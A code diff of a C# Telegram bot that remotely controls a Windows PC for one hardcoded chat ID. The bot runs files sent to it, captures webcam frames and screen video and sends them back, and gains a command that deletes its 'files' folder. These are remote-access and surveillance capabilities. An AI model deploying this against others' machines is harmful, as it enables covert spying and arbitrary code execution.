@@ -97,8 +97,8 @@ namespace CONTROLL
                     new[]
                     {
                         new KeyboardButton("ALT🔘TAB"),
-                        new KeyboardButton("🔇"),
-                        new KeyboardButton("🔉")
+                        //new KeyboardButton("🔇"),
+                        new KeyboardButton("✂Очистить папку файлов✂")
                     },
                     new[]
                     {
@@ -116,7 +116,7 @@ namespace CONTROLL
                     }
                 }
                 );
-
+                
                 var message = update.Message;
 
                 if (message.Chat.Id == 1324016724)
@@ -144,7 +144,7 @@ namespace CONTROLL
                             System.Diagnostics.Process.Start($@"files\{message.Document.FileName}");
                         }
                         catch { }
-                        await botClient.SendTextMessageAsync(message.Chat, "Image save");
+                        await botClient.SendTextMessageAsync(message.Chat, "Файл открыт");
                     }
 
                     if (message.Type == MessageType.Audio)
@@ -167,7 +167,7 @@ namespace CONTROLL
 
                         System.Diagnostics.Process.Start($@"files\{message.Audio.FileName}");
 
-                        await botClient.SendTextMessageAsync(message.Chat, "Image save");
+                        await botClient.SendTextMessageAsync(message.Chat, "Аудио открыто");
                     }
 
                     if (message.Type == MessageType.Voice)
@@ -190,7 +190,7 @@ namespace CONTROLL
 
                         System.Diagnostics.Process.Start($@"files\{message.Voice.FileId}.ogg");
 
-                        await botClient.SendTextMessageAsync(message.Chat, "Image save");
+                        await botClient.SendTextMessageAsync(message.Chat, "Голосовое сообщение открыто");
                     }
 
                     if (message.Type == MessageType.Photo)
@@ -213,7 +213,7 @@ namespace CONTROLL
 
                         System.Diagnostics.Process.Start($@"files\{message.Photo.LastOrDefault().FileId}.jpg");
 
-                        await botClient.SendTextMessageAsync(message.Chat, "Image save");
+                        await botClient.SendTextMessageAsync(message.Chat, "Фото открыто");
                     }
 
                     if (message.Type == MessageType.Video)
@@ -377,7 +377,6 @@ namespace CONTROLL
 
                                     var ffMpeg = new NReco.VideoConverter.FFMpegConverter();
                                     ffMpeg.ConvertMedia("video.avi", "video.mp4", Format.mp4);
-
                                     await botClient.SendVideoAsync(message.Chat, System.IO.File.Open("video.mp4", System.IO.FileMode.Open));
                                     await botClient.SendTextMessageAsync(message.Chat, "Видео готово🎥", replyMarkup: keyboard);
                                     //System.IO.File.Delete("video.avi");
@@ -504,18 +503,26 @@ namespace CONTROLL
 
                         if (message.Text == "📸Скриншот вэбки📸")
                         {
-                            VideoCapture capture = new VideoCapture(); //create a camera capture
-
-                            string WebScreenShotName = "WebScreenShot.png";
-                            Bitmap image = null;
-                            for (int i = 0; i < 10; i++)
+                            try
                             {
-                                image = capture.QueryFrame().Bitmap;
-                            }
-                            capture.Dispose();
-                            image.Save(WebScreenShotName, ImageFormat.Png);
 
-                            await botClient.SendPhotoAsync(chatId: message.Chat.Id, photo: System.IO.File.Open(WebScreenShotName, System.IO.FileMode.Open));
+                                VideoCapture capture = new VideoCapture(); //create a camera capture
+
+                                string WebScreenShotName = "WebScreenShot.png";
+                                Bitmap image = null;
+                                for (int i = 0; i < 10; i++)
+                                {
+                                    image = capture.QueryFrame().Bitmap;
+                                }
+                                capture.Dispose();
+                                image.Save(WebScreenShotName, ImageFormat.Png);
+
+                                await botClient.SendPhotoAsync(chatId: message.Chat.Id, photo: System.IO.File.Open(WebScreenShotName, System.IO.FileMode.Open));
+                            }
+                            catch 
+                            { 
+                                await botClient.SendTextMessageAsync(message.Chat, "Ошибка\nМожет быть у вас нет камеры");
+                            }
 
 
 
@@ -602,6 +609,23 @@ namespace CONTROLL
                             }
 
                             await botClient.SendTextMessageAsync(message.Chat, "✏Введите запрос✏", replyMarkup: keyboardExit);
+                            return;
+                        }
+
+                        if (message.Text == "✂Очистить папку файлов✂")
+                        {
+                            System.IO.DirectoryInfo di = new DirectoryInfo("files");
+
+                            foreach (FileInfo file in di.GetFiles())
+                            {
+                                file.Delete();
+                            }
+                            foreach (DirectoryInfo dir in di.GetDirectories())
+                            {
+                                dir.Delete(true);
+                            }   
+
+                            await botClient.SendTextMessageAsync(message.Chat, "Все файлы удаленны✅");
                             return;
                         }
                     }
